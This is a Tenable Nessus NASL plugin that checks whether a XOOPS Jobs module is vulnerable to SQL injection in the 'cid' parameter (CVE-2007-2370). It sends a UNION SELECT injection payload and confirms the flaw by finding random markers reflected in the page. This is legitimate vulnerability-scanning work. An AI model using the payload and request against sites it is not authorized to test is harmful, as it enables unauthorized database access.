#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24999);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-2370");
  script_bugtraq_id(23344);
  script_xref(name:"OSVDB", value:"34461");

  script_name(english:"XOOPS Jobs Module index.php cid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate subcategory text with Jobs module");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Jobs module, a third-party module for
XOOPS. 

The version of this module installed on the remote host fails to
properly sanitize user-supplied input to the 'cid' parameter of the
'modules/jobs/index.php' script before using it to build a database
query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated remote attacker can leverage this issue to launch SQL
injection attacks against the affected application, leading to
discovery of sensitive information, attacks against the underlying
database, and the like." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3672" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to manipulate the main text.
  magic1 = rand();
  magic2 = unixtime();
  exploit = string("-1 UNION SELECT ", magic1, ",", magic2, ",1--");

  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/modules/jobs/index.php?",
      "pa=jobsview&",
      "cid=", urlencode(str:exploit)
    ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we managed to set the subcategory based on our magic.
  if (
    "modules/jobs/images/cat/" >< res &&
    string("&amp;cid=", magic1, '"><b>', magic2, "</b>") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
